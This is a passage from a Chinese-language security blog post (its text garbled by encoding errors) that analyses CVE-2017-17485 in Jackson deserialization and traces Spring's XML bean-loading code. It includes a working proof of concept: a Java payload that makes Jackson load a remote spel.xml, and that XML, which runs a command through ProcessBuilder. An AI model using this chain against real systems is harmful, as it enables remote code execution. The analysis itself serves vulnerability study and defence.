</span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-expression<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-æ¼æ´å¤ç°"><a href="#0x02-æ¼æ´å¤ç°" class="headerlink" title="0x02 æ¼æ´å¤ç°"></a>0x02 æ¼æ´å¤ç°</h2><p><code>ClassPathXmlApplicationContext</code> è¿™ä¸ªç±»æ˜¯ç”¨æ¥åŠ è½½ä¸€äº› XML èµ„æºçš„ï¼Œè€Œæœ€åçš„æ”»å‡»å®ç°ä¹Ÿæ˜¯å¦‚æ­¤</p><p><strong>PoC.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PoC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;  </span><br><span class="line">        <span class="comment">//CVE-2017-17485  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;[\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;, \&quot;http://127.0.0.1:8888/spel.xml\&quot;]&quot;</span>;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            mapper.readValue(payload, Object.class);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>spel.xmlï¼Œæ”¾ç½®åœ¨ç¬¬ä¸‰æ–¹ Web æœåŠ¡ä¸­ï¼Œçœ‹åˆ° id ä¸º pb çš„ bean æ ‡ç­¾ï¼ŒæŒ‡å®šäº†ç±»ä¸º <code>java.lang.ProcessBuilder</code>ï¼Œåœ¨å…¶ä¸­æœ‰ä¸¤ä¸ªå­æ ‡ç­¾ï¼Œ<code>constructor-arg</code> æ ‡ç­¾è®¾ç½®å‚æ•°å€¼ä¸ºå…·ä½“çš„å‘½ä»¤ï¼Œproperty æ ‡ç­¾è°ƒç”¨ <code>start()</code> æ–¹æ³•ï¼š</p><p><strong>spel.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span>  </span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;  </span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;calc&quot;</span> /&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123; pb.start() &#125;&quot;</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸå‘½ä»¤æ‰§è¡Œ</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/calc.png" class><h2 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03 æ¼æ´åˆ†æ"></a>0x03 æ¼æ´åˆ†æ</h2><p>è¿™é‡Œçš„ XML å†…å®¹è§£æï¼Œåˆ° SpEL è¡¨è¾¾å¼æ³¨å…¥ï¼Œå…¶å®æ˜¯æ¶‰åŠåˆ° Spring çš„ IOC åŸåˆ™ï¼Œç®€å•æ¥è¿‡ä¸€éã€‚</p><p>å‰é¢ Jackson çš„ååºåˆ—åŒ–è§£æéƒ¨åˆ†å°±ä¸çœ‹äº†ï¼Œç›´æ¥åˆ° Jackson è°ƒç”¨ <code>ClassPathXmlApplicationContext</code> çš„æ„é€ å‡½æ•°ã€‚åœ¨ <code>ClassPathXmlApplicationContext</code> ä¸­æœ‰å¾ˆå¤šæ„é€ æ–¹æ³•ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæ˜¯ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²çš„ï¼ˆå³é…ç½®æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ï¼‰ï¼Œä½†æœ€ç»ˆæ˜¯è°ƒç”¨çš„ä¸‹é¢è¿™ä¸ªæ„é€ ï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/ClassPathXmlApplicationContextConstructor.png" class><p>Spring åœ¨è¿™é‡Œå…ˆåˆ›å»ºè§£æå™¨ï¼Œè§£æ configLocationsï¼Œè·Ÿè¿› <code>refresh()</code> æ–¹æ³•ï¼Œ<code>refresh()</code> æ–¹æ³•åšçš„æ ¸å¿ƒä¸šåŠ¡æ˜¯åˆ·æ–°å®¹å™¨ï¼ˆå¯åŠ¨å®¹å™¨éƒ½ä¼šè°ƒç”¨è¯¥æ–¹æ³•ï¼‰ï¼Œè·Ÿè¿›ä¹‹åçš„æ ¸å¿ƒä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">refresh</span><span class="params">()</span> <span class="keyword">throws</span> BeansException, IllegalStateException &#123;  </span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>.startupShutdownMonitor) &#123;  </span><br><span class="line">       <span class="comment">// Prepare this context for refreshing.  </span></span><br><span class="line">       prepareRefresh();  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// Tell the subclass to refresh the internal bean factory.  </span></span><br><span class="line">       <span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> obtainFreshBeanFactory();  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// Prepare the bean factory for use in this context.  </span></span><br><span class="line">       prepareBeanFactory(beanFactory);  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">try</span> &#123;  </span><br><span class="line">          <span class="comment">// Allows post-processing of the bean factory in context subclasses.  </span></span><br><span class="line">          postProcessBeanFactory(beanFactory);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Invoke factory processors registered as beans in the context.  </span></span><br><span class="line">          invokeBeanFactoryPostProcessors(beanFactory);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Register bean processors that intercept bean creation.  </span></span><br><span class="line">          registerBeanPostProcessors(beanFactory);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Initialize message source for this context.  </span></span><br><span class="line">          initMessageSource();  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Initialize event multicaster for this context.  </span></span><br><span class="line">          initApplicationEventMulticaster();  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Initialize other special beans in specific context subclasses.  </span></span><br><span class="line">          onRefresh();  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Check for listener beans and register them.  </span></span><br><span class="line">          registerListeners();  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Instantiate all remaining (non-lazy-init) singletons.  </span></span><br><span class="line">          finishBeanFactoryInitialization(beanFactory);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Last step: publish corresponding event.  </span></span><br><span class="line">          finishRefresh();  </span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>å…ˆè·Ÿè¿› <code>obtainFreshBeanFactory()</code> æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªå…¸å‹çš„<strong>æ¨¡æ¿æ–¹æ³•æ¨¡å¼</strong>çš„å®ç°ï¼Œç¬¬ä¸€æ­¥æ˜¯å‡†å¤‡åˆå§‹åŒ–å®¹å™¨ç¯å¢ƒï¼Œè¿™ä¸€æ­¥ä¸é‡è¦ï¼Œé‡ç‚¹æ˜¯ç¬¬äºŒæ­¥ï¼Œåˆ›å»º BeanFactory å¯¹è±¡ã€åŠ è½½è§£æ xml å¹¶å°è£…æˆ<strong>BeanDefinition</strong>å¯¹è±¡éƒ½æ˜¯åœ¨è¿™ä¸€æ­¥å®Œæˆçš„ã€‚</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/obtainFreshBeanFactory.png" class><p>è·Ÿè¿›ï¼Œåˆ¤æ–­å¦‚æœ BeanFactory ä¸ä¸ºç©ºï¼Œåˆ™æ¸…é™¤ BeanFactory å’Œé‡Œé¢çš„å®ä¾‹ï¼Œæ¥ç€åˆ›å»ºäº†ä¸€ä¸ª <strong>DefaultListableBeanFactory</strong> å¯¹è±¡å¹¶ä¼ å…¥åˆ°äº† <strong>loadBeanDefinitions</strong> æ–¹æ³•ä¸­ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ¨¡æ¿æ–¹æ³•ï¼Œå› ä¸ºæˆ‘ä»¬çš„é…ç½®ä¸æ­¢æœ‰ xmlï¼Œè¿˜æœ‰æ³¨è§£ç­‰ã€‚</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/refreshBeanFactory.png" class><p>åœ¨æ•´ä½“å°è£…å®Œæ¯•ä¹‹åï¼Œè¿™é‡Œçš„ XML å°±å·²ç»è¢«åŠ è½½è¿›æ¥äº†ï¼ŒæŠŠ inputSource å°è£…æˆ Document æ–‡ä»¶å¯¹è±¡ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">loadBeanDefinitions</span><span class="params">(EncodedResource encodedResource)</span> <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//è·å–Resourceå¯¹è±¡ä¸­çš„xmlæ–‡ä»¶æµå¯¹è±¡</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> encodedResource.getResource().getInputStream();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//InputSourceæ˜¯jdkä¸­çš„sax xmlæ–‡ä»¶è§£æå¯¹è±¡</span></span><br><span class="line"><span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(inputStream);</span><br><span class="line"><span class="keyword">if</span> (encodedResource.getEncoding() != <span class="literal">null</span>) &#123;</span><br><span class="line">inputSource.setEncoding(encodedResource.getEncoding());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¸»è¦çœ‹è¿™ä¸ªæ–¹æ³•</span></span><br><span class="line"><span class="keyword">return</span> doLoadBeanDefinitions(inputSource, encodedResource.getResource());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">inputStream.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">doLoadBeanDefinitions</span><span class="params">(InputSource inputSource, Resource resource)</span></span><br><span class="line"><span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//æŠŠinputSource å°è£…æˆDocumentæ–‡ä»¶å¯¹è±¡ï¼Œè¿™æ˜¯jdkçš„API</span></span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> doLoadDocument(inputSource, resource);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸»è¦çœ‹è¿™ä¸ªæ–¹æ³•ï¼Œæ ¹æ®è§£æå‡ºæ¥çš„documentå¯¹è±¡ï¼Œæ‹¿åˆ°é‡Œé¢çš„æ ‡ç­¾å…ƒç´ å°è£…æˆBeanDefinition</span></span><br><span class="line"><span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> registerBeanDefinitions(doc, resource);</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">&quot;Loaded &quot;</span> + count + <span class="string">&quot; bean definitions from &quot;</span> + resource);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">registerBeanDefinitions</span><span class="params">(Document doc, Resource resource)</span> <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line"><span class="comment">// åˆ›å»ºDefaultBeanDefinitionDocumentReaderå¯¹è±¡ï¼Œå¹¶å§”æ‰˜å…¶åšè§£ææ³¨å†Œå·¥ä½œ</span></span><br><span class="line"><span class="type">BeanDefinitionDocumentReader</span> <span class="variable">documentReader</span> <span class="operator">=</span> createBeanDefinitionDocumentReader();</span><br><span class="line"><span class="type">int</span> <span class="variable">countBefore</span> <span class="operator">=</span> getRegistry().getBeanDefinitionCount();</span><br><span class="line"><span class="comment">//ä¸»è¦çœ‹è¿™ä¸ªæ–¹æ³•ï¼Œéœ€è¦æ³¨æ„createReaderContextæ–¹æ³•ä¸­åˆ›å»ºçš„å‡ ä¸ªå¯¹è±¡</span></span><br><span class="line">documentReader.registerBeanDefinitions(doc, createReaderContext(resource));</span><br><span class="line"><span class="keyword">return</span> getRegistry().getBeanDefinitionCount() - countBefore;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> XmlReaderContext <span class="title function_">createReaderContext</span><span class="params">(Resource resource)</span> &#123;</span><br><span class="line"><span class="comment">// XmlReaderContextå¯¹è±¡ä¸­ä¿å­˜äº†XmlBeanDefinitionReaderå¯¹è±¡å’ŒDefaultNamespaceHandlerResolverå¯¹è±¡çš„å¼•ç”¨ï¼Œåœ¨åé¢ä¼šç”¨åˆ°</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">XmlReaderContext</span>(resource, <span class="built_in">this</span>.problemReporter, <span class="built_in">this</span>.eventListener,</span><br><span class="line"><span class="built_in">this</span>.sourceExtractor, <span class="built_in">this</span>, getNamespaceHandlerResolver());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/doLoadBeanDefinitions.png" class><p>æ¥ç€çœ‹çœ‹ <strong>DefaultBeanDefinitionDocumentReader</strong> ä¸­æ˜¯å¦‚ä½•è§£æçš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doRegisterBeanDefinitions</span><span class="params">(Element root)</span> &#123;</span><br><span class="line"><span class="comment">// åˆ›å»ºäº†BeanDefinitionParserDelegateå¯¹è±¡</span></span><br><span class="line"><span class="type">BeanDefinitionParserDelegate</span> <span class="variable">parent</span> <span class="operator">=</span> <span class="built_in">this</span>.delegate;</span><br><span class="line"><span class="built_in">this</span>.delegate = createDelegate(getReaderContext(), root, parent);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœæ˜¯SpringåŸç”Ÿå‘½åç©ºé—´ï¼Œé¦–å…ˆè§£æ profileæ ‡ç­¾ï¼Œè¿™é‡Œä¸é‡è¦</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.delegate.isDefaultNamespace(root)) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">profileSpec</span> <span class="operator">=</span> root.getAttribute(PROFILE_ATTRIBUTE);</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(profileSpec)) &#123;</span><br><span class="line">String[] specifiedProfiles = StringUtils.tokenizeToStringArray(</span><br><span class="line">profileSpec, BeanDefinitionParserDelegate.MULTI_VALUE_ATTRIBUTE_DELIMITERS);</span><br><span class="line"><span class="comment">// We cannot use Profiles.of(...) since profile expressions are not supported</span></span><br><span class="line"><span class="comment">// in XML config. See SPR-12458 for details.</span></span><br><span class="line"><span class="keyword">if</span> (!getReaderContext().getEnvironment().acceptsProfiles(specifiedProfiles)) &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">&quot;Skipped XML bean definition file due to specified profiles [&quot;</span> + profileSpec +</span><br><span class="line"><span class="string">&quot;] not matching: &quot;</span> + getReaderContext().getResource());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preProcessXml(root);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸»è¦çœ‹è¿™ä¸ªæ–¹æ³•ï¼Œæ ‡ç­¾å…·ä½“è§£æè¿‡ç¨‹</span></span><br><span class="line">parseBeanDefinitions(root, <span class="built_in">this</span>.delegate);</span><br><span class="line">postProcessXml(root);</span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.delegate = parent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è°ƒç”¨æ ˆæ˜¯è¿™ä¹ˆèµ°ä¸‹æ¥çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">doRegisterBeanDefinitions:<span class="number">129</span>, DefaultBeanDefinitionDocumentReader (org.springframework.beans.factory.xml)</span><br><span class="line">registerBeanDefinitions:<span class="number">98</span>, DefaultBeanDefinitionDocumentReader (org.springframework.beans.factory.xml)</span><br><span class="line">registerBeanDefinitions:<span class="number">507</span>, XmlBeanDefinitionReader (org.springframework.beans.factory.xml)</span><br><span class="line">doLoadBeanDefinitions:<span class="number">391</span>, XmlBeanDefinitionReader (org.springframework.beans.factory.xml)</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªæ–¹æ³•ä¸­é‡ç‚¹å…³æ³¨<strong>preProcessXml</strong>ã€<strong>parseBeanDefinitions</strong>ã€<strong>postProcessXml</strong>ä¸‰ä¸ªæ–¹æ³•ï¼Œå…¶ä¸­ preProcessXml å’Œ postProcessXml éƒ½æ˜¯ç©ºæ–¹æ³•ï¼Œæ„æ€æ˜¯åœ¨è§£ææ ‡ç­¾å‰åæˆ‘ä»¬è‡ªå·±å¯ä»¥æ‰©å±•éœ€è¦æ‰§è¡Œçš„æ“ä½œï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæ¨¡æ¿æ–¹æ³•æ¨¡å¼ï¼Œä½“ç°äº† Spring çš„é«˜æ‰©å±•æ€§ã€‚ç„¶åè¿›å…¥ parseBeanDefinitions æ–¹æ³•çœ‹å…·ä½“æ˜¯æ€ä¹ˆè§£ææ ‡ç­¾çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">parseBeanDefinitions</span><span class="params">(Element root, BeanDefinitionParserDelegate delegate)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (delegate.isDefaultNamespace(root)) &#123;</span><br><span class="line"><span class="type">NodeList</span> <span class="variable">nl</span> <span class="operator">=</span> root.getChildNodes();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nl.getLength(); i++) &#123;</span><br><span class="line"><span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> nl.item(i);</span><br><span class="line"><span class="keyword">if</span> (node <span class="keyword">instanceof</span> Element) &#123;</span><br><span class="line"><span class="type">Element</span> <span class="variable">ele</span> <span class="operator">=</span> (Element) node;</span><br><span class="line"><span class="keyword">if</span> (delegate.isDefaultNamespace(ele)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//é»˜è®¤æ ‡ç­¾è§£æ</span></span><br><span class="line">parseDefaultElement(ele, delegate);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰æ ‡ç­¾è§£æ</span></span><br><span class="line">delegate.parseCustomElement(ele);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">delegate.parseCustomElement(root);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸¤ç§æ ‡ç­¾çš„è§£æï¼š<strong>Spring åŸç”Ÿæ ‡ç­¾</strong>å’Œ<strong>è‡ªå®šä¹‰æ ‡ç­¾</strong>ã€‚æ€ä¹ˆåŒºåˆ†è¿™ä¸¤ç§æ ‡ç­¾å‘¢ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è‡ªå®šä¹‰æ ‡ç­¾</span></span><br><span class="line">&lt;context:component-scan/&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é»˜è®¤æ ‡ç­¾</span></span><br><span class="line">&lt;bean:/&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šï¼Œå¸¦å‰ç¼€çš„å°±æ˜¯è‡ªå®šä¹‰æ ‡ç­¾ï¼Œå¦åˆ™å°±æ˜¯ Spring é»˜è®¤æ ‡ç­¾ï¼Œæ— è®ºå“ªç§æ ‡ç­¾åœ¨ä½¿ç”¨å‰éƒ½éœ€è¦åœ¨ Spring çš„ xml é…ç½®æ–‡ä»¶é‡Œå£°æ˜ Namespace URIï¼Œè¿™æ ·åœ¨è§£ææ ‡ç­¾æ—¶æ‰èƒ½é€šè¿‡ Namespace URI æ‰¾åˆ°å¯¹åº”çš„ NamespaceHandlerã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line"></span><br><span class="line">http://www.springframework.org/schema/beans</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° <code>http://www.springframework.org/schema/beans</code> æ‰€å¯¹åº”çš„å°±æ˜¯é»˜è®¤æ ‡ç­¾ã€‚æ¥ç€ï¼Œæˆ‘ä»¬è¿›å…¥<strong>parseDefaultElement</strong>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 